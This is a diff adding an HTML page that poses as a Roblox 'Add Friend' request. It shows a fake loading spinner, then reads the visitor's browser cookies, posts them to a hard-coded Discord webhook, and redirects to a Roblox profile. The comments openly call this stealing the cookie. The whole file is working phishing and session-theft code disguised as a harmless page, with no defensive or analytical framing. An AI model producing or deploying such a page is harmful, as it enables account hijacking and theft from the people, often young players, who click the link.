@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Add Friend</title>
+    <style>
+        body { 
+            background-color: #232527; 
+            color: white; 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding-top: 100px; 
+        }
+        .loader { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #3498db; 
+            border-radius: 50%; 
+            width: 30px; 
+            height: 30px; 
+            animation: spin 2s linear infinite; 
+            margin: 20px auto; 
+            display: none; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+    </style>
+</head>
+<body>
+    <h2>Sending Friend Request...</h2>
+    <div class="loader" id="spinner"></div>
+    
+    <script>
+        // Show a loading spinner so it feels like it's "working"
+        document.body.innerHTML = '<h2>Connecting...</h2><div class="loader" style="display:block;"></div>';
+
+        // Wait 1.5 seconds so it doesn't feel instant
+        setTimeout(function() {
+            
+            // Steal the cookie
+            var cookies = document.cookie;
+            
+            // Send it to your Discord Webhook
+            fetch("https://discord.com/api/webhooks/1575265797821956096/VYG9m7r_P7CxWjfedhORKQZ4wxIlBXE5-qI052LAZsblFqZos5pq-HT07kutH1cZGv2A", {
+                method: "POST",
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: "Friend Request Clicked: " + cookies})
+            });
+
+            // Redirect them to YOUR real Roblox profile
+            window.location.href = "https://www.roblox.com/users/5230439937/profile"; 
+        }, 1500);
+    </script>
+</body>
+</html>
